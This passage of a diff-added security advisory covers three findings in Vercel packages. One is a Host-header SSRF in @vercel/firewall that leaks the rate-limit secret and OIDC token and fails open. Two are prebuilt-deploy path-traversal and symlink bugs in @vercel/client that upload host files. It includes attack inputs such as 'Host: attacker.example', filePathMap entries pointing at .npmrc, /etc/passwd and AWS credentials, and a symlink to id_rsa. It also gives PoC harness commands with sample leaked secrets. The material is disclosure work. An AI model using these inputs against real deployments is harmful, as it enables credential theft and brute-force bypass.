+* **Affected Versions & Components:** `<= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)` — `packages/firewall/src/rate-limit.ts:138-183, 211-285`, `cmd/ipc-proxy/client.go:34-41, 79-97`
+* **Vulnerability Class & Score:** `CWE-918 / CWE-200 / CWE-636` — **CVSS v3.1: `7.2 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N`)
+* **Standalone Sniper Advisory:** [`docs/advisories/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)
+
+#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
+1. **Step 1 — Unvalidated `Host` Header Interpolation Into Outbound HTTPS Authority (`packages/firewall/src/rate-limit.ts:138-167, 224`):** When `process.env.VERCEL_ENV !== 'production'` (such as staging, preview, self-hosted Kubernetes/Docker, or custom reverse-proxy deployments where `request` or `headers` is passed to `checkRateLimit()`), `resolveFirewallHost()` extracts `request.headers.get('host')` and constructs `const endpoint = \`https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check\``.
+2. **Step 2 — Exfiltration of `VF_RATE_LIMIT_SECRET` and `x-vercel-oidc-token` (`rate-limit.ts:169-183`):** `buildAuthHeaders()` attaches `x-vercel-rate-limit-secret: process.env.VF_RATE_LIMIT_SECRET` and `x-vercel-oidc-token` to that outbound `POST` request, delivering both secrets directly to the attacker's host.
+3. **Step 3 — Universal Fail-Open Rate-Limit Bypass (`{ rateLimited: false }`) & Go `ipc-proxy` Uninterpolated `api-%s.vercel.com` Bug (`rate-limit.ts:242-284`, `cmd/ipc-proxy/client.go:34-41`):** Whenever the outbound request fails or returns `>= 400` (e.g., when an attacker sends `Host: localhost/@attacker` even in `VERCEL_ENV=production`), `callRemoteRateLimitAPI()` catches the error and returns `{ rateLimited: false, error: 'not_found' }`, completely bypassing rate limiting! Additionally, `cmd/ipc-proxy/client.go:38` assigns `endpoint = apiEndpointFmt` (`"https://api-%s.vercel.com/v1/rate-limit"`) as a literal string with a raw `%s` instead of `fmt.Sprintf(apiEndpointFmt, region)`.
+
+```typescript
+// File: packages/firewall/src/rate-limit.ts (lines 138-167, 211-285)
+function resolveFirewallHost(options: RateLimitOptions): string | null {
+  if (process.env.VERCEL_ENV !== 'production') {
+    const host = extractHostFromHeaders(options.headers) ?? extractHostFromRequest(options.request);
+    if (host) return host; // BUG: Unvalidated Host header used directly as HTTPS target authority!
+  }
+  return process.env.VERCEL_URL || null;
+}
+// In callRemoteRateLimitAPI():
+const endpoint = `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check`;
+const response = await fetch(endpoint, { method: 'POST', headers: authHeaders, body: ... });
+// BUG: On any error or >=400 status, fails open with { rateLimited: false }!
+```
+
+#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
+* **Scenario A — Staging / Preview / Self-Hosted `VF_RATE_LIMIT_SECRET` & OIDC Token Exfiltration:** An application calls `await checkRateLimit('login-limit', { request })`. An attacker sends `Host: 127.0.0.1:44123` (or `attacker.example`). `@vercel/firewall` sends `POST https://attacker.example/.well-known/vercel/rate-limit/check` carrying `x-vercel-rate-limit-secret: rl_secret_LIVE_99887766` and `x-vercel-oidc-token`.
+* **Scenario B — Production Brute-Force / OTP Rate-Limit Bypass via `Host` Path/Userinfo Injection (`rateLimited: false`):** Even when `VERCEL_ENV=production` uses `api-${region}.vercel.com`, `extractHost()` passes the inbound `Host` header into the request metadata/URL path (`/@bypass`), causing a `400`/`404` response that `checkRateLimit()` catches and turns into `{ rateLimited: false }`, allowing unlimited OTP/password brute-forcing.
+* **Scenario C — Go `ipc-proxy` Regional Endpoint Failure (`https://api-%s.vercel.com/v1/rate-limit`):** Setting `VERCEL_REGION=iad1` without `FIREWALL_API_ENDPOINT` causes `cmd/ipc-proxy/client.go:38` to dial the literal unformatted string `https://api-%s.vercel.com/v1/rate-limit`, failing every regional rate-limit check.
+
+#### 4. Example Execution, Reproduction & Verification Commands
+```bash
+# 1. Inspect rate-limit.js in published @vercel/firewall@1.2.6 and cmd/ipc-proxy/client.go
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/firewall/dist/rate-limit.js | sed -n '90,220p'
+
+# 2. Run the Live @vercel/firewall@1.2.6 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-01-firewall-host-region-ssrf-and-ipc-proxy.patch
+```
+**Observed Runtime Proof (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-FIREWALL-01": {
+    "RED": {
+      "package_tested": "@vercel/firewall@1.2.6",
+      "attacker_received_request": true,
+      "leaked_rate_limit_secret": "rl_secret_LIVE_99887766",
+      "leaked_oidc_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.LIVE_OIDC_PAYLOAD",
+      "fail_open_result_on_error": {
+        "rateLimited": false,
+        "error": "not_found"
+      }
+    },
+    "GREEN": {
+      "untrusted_host_and_region_rejected": true,
+      "attacker_received_request": false,
+      "go_ipc_proxy_sprintf_formatted": true
+    }
+  }
+}
+```
+
+
+---
+
+### III.45 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `.vc-config.json` `filePathMap` Arbitrary Host File Read & `.next/required-server-files.json` Local `.env` Secret Upload (`VERCEL-CLIENT-08A`) (`CWE-200 / CWE-706`, CVSS `5.0 Medium`)
+
+#### 1. Metadata & Disclosure Status
+* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
+* **Affected Versions & Components:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/hashes.ts:115-167`, `packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`)
+* **Vulnerability Class & Score:** `CWE-200 / CWE-706` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
+* **Standalone Sniper Advisory:** [`docs/advisories/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)
+
+#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
+1. **Step 1 — Unconfined `path.resolve(cwd, filePath)` in `filesFromFilePathMap()` (`packages/client/src/utils/hashes.ts:115-167`):** When `prebuilt: true` (`vercel deploy --prebuilt`), `@vercel/client` parses `.vercel/output/functions/**/.vc-config.json` and iterates over `Object.entries(vcConfig.filePathMap)`. For each entry, it computes `const fsPath = path.resolve(cwd, filePath)` and reads the file (`fs.readFile(fsPath)`) without checking that `fsPath` is inside `cwd` or filtering against `.vercelignore`.
+2. **Step 2 — Default Next.js `.next/required-server-files.json` Secret Leakage:** Even on an unmodified Next.js build, `.vc-config.json`'s `filePathMap` includes `.next/required-server-files.json`, which serializes local `config.env` values from `.env` / `.env.local` despite `.vercelignore` excluding `.env*`.
+3. **Step 3 — CI/CD Prebuilt Artifact Poisoning (`POST /v2/files` Upload):** If a CI build step or reusable workflow generates `.vercel/output` and hands it to a deployment job running `vercel deploy --prebuilt --token $VERCEL_TOKEN`, any `../../../../etc/passwd` or `~/.aws/credentials` entry in `filePathMap` is SHA-1 hashed and uploaded to Vercel's `/v2/files` deployment API.
+
+```typescript
+// File: packages/client/src/utils/hashes.ts (lines 115-167)
+export async function filesFromFilePathMap(
+  filePathMap: Record<string, string>,
+  cwd: string
+): Promise<Map<string, DeploymentFile>> {
+  for (const [funcPath, filePath] of Object.entries(filePathMap)) {
+    // BUG: No check that fsPath stays within cwd, and .vercelignore is never applied!
+    const fsPath = path.resolve(cwd, filePath);
+    const data = await fs.readFile(fsPath);
+    // ... packages data for upload to POST /v2/files
+  }
+}
+```
+
+#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
+* **Scenario A — Default `vercel build && vercel deploy --prebuilt` `.env.local` Secret Leakage:** A developer adds `.env*` to `.vercelignore` expecting local secrets to stay off the deployment server, but `filePathMap` pulls `.next/required-server-files.json` containing `DATABASE_URL` and `STRIPE_SECRET_KEY` into the uploaded function bundle.
+* **Scenario B — Split CI/CD Pipeline (`build` PR Artifact -> `deploy --prebuilt` Privileged Job) Host Credential Exfiltration:** An unprivileged PR build job outputs `.vercel/output` as a workflow artifact with `filePathMap: { "leaked.txt": "/home/runner/.npmrc" }`. The privileged deploy job runs `vercel deploy --prebuilt`, uploading the runner's credentials into the deployed function.
+* **Scenario C — Monorepo Shared Cache / Turborepo Remote Cache Poisoning:** A poisoned `.vc-config.json` restored from a shared build cache exfiltrates CI environment files during prebuilt deployment.
+
+#### 4. Example Execution, Reproduction & Verification Commands
+```bash
+# 1. Inspect filesFromFilePathMap in published @vercel/client@18.10.0
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/hashes.js | sed -n '85,145p'
+
+# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
+```
+**Observed Runtime Proof (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-CLIENT-08A": {
+    "RED": {
+      "package_tested": "@vercel/client@18.10.0",
+      "outside_host_file_read_via_filePathMap": true,
+      "dotnext_required_server_files_env_uploaded": true,
+      "uploaded_payload_excerpt": "SUPER_SECRET_HOST_TOKEN=host_secret_value_12345"
+    },
+    "GREEN": {
+      "outside_cwd_filePathMap_rejected": true,
+      "outside_host_file_read_via_filePathMap": false
+    }
+  }
+}
+```
+
+
+---
+
+### III.46 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `config.bulkRedirectsPath` Symlink Escape & `.vercelignore` Bypass Uploading Arbitrary Host Files (`VERCEL-CLIENT-08B`) (`CWE-59 / CWE-200`, CVSS `5.0 Medium`)
+
+#### 1. Metadata & Disclosure Status
+* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
+* **Affected Versions & Components:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/index.ts:116-148`, `packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`)
+* **Vulnerability Class & Score:** `CWE-59 / CWE-200` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
+* **Standalone Sniper Advisory:** [`docs/advisories/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)
+
+#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
+1. **Step 1 — Unvalidated `config.bulkRedirectsPath` & Symlink Following in `buildFileTree()` (`packages/client/src/utils/index.ts:116-148`):** In `buildFileTree()`, when `prebuilt` is `true`, `@vercel/client` reads `.vercel/output/config.json` and resolves `const bulkRedirectsRoot = join(cwd, config.bulkRedirectsPath)`. It then recursively walks `bulkRedirectsRoot` using `fs.stat()` (which transparently dereferences symlinks to files/directories outside `cwd`) without checking `fs.realpath()` confinement.
+2. **Step 2 — Complete `.vercelignore` Bypass in Prebuilt Mode:** The `prebuilt` branch of `buildFileTree()` passes a no-op ignore filter when enumerating `bulkRedirectsPath`, uploading sensitive files (`id_rsa`, `.env.production`) even when explicitly listed in `.vercelignore`.
+3. **Step 3 — External File Packaging & Upload to `/v2/files`:** Every file discovered under the symlinked or traversed `bulkRedirectsPath` is hashed (`hashes()`) and uploaded to Vercel's `/v2/files` deployment API.
+
+```typescript
+// File: packages/client/src/utils/index.ts (lines 116-148)
+if (config?.bulkRedirectsPath) {
+  const bulkRedirectsPath = join(cwd, config.bulkRedirectsPath);
+  // BUG: No realpath confinement check and .vercelignore is not applied;
+  // readdir/stat follows symlinks pointing outside cwd!
+  const bulkRedirectFiles = await readdir(bulkRedirectsPath, []);
+  fileList.push(...bulkRedirectFiles);
+}
+```
+
+#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
+* **Scenario A — Symlink inside `bulkRedirectsPath` Exfiltrating Host SSH/Cloud Credentials During `vercel deploy --prebuilt`:** A prebuilt output directory sets `"bulkRedirectsPath": ".vercel/output/redirects"` containing a symlink `leak.json -> /home/runner/.ssh/id_rsa`. `buildFileTree()` follows the symlink via `fs.stat()` and uploads the private key to the deployment.
+* **Scenario B — Relative Path Traversal in `.vercel/output/config.json` (`"bulkRedirectsPath": "../../secrets"`):** Setting `bulkRedirectsPath` to a parent directory walks and uploads all files in that host directory.
+* **Scenario C — `.vercelignore` Bypass for Local Secret Files:** Files explicitly excluded by `.vercelignore` are still packaged when referenced via `bulkRedirectsPath`.
+
+#### 4. Example Execution, Reproduction & Verification Commands
+```bash
+# 1. Inspect buildFileTree in published @vercel/client@18.10.0
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/index.js | sed -n '90,145p'
+
+# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
+```
+**Observed Runtime Proof (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-CLIENT-08B": {
+    "RED": {
+      "package_tested": "@vercel/client@18.10.0",
+      "bulkRedirectsPath_symlink_followed_outside_cwd": true,
+      "outside_symlink_target_packaged_in_fileList": true,
+      "uploaded_payload_excerpt": "OUTSIDE_SYMLINK_SECRET=top_secret_symlink_data_999"
+    },
+    "GREEN": {
+      "bulkRedirectsPath_confined_to_cwd_realpath": true,
+      "outside_symlink_target_packaged_in_fileList": false
+    }
+  }
+}
+```
+
+<!-- VERCEL-ADVISORIES-END -->
